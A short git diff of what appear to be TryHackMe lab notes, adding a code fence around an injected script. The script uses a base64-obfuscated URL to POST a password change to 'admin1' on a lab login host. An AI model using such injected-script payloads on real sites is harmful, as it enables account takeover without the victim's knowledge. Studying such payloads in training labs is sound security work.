@@ -5,6 +5,7 @@ atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw') Base64 enco
 
 courtesy of tryhackme:
 
+```
 <script>
         var xhr = new XMLHttpRequest();
         xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
@@ -17,3 +18,4 @@ courtesy of tryhackme:
         };
         xhr.send('action=execute&new_password=admin1');
     </script>
+```
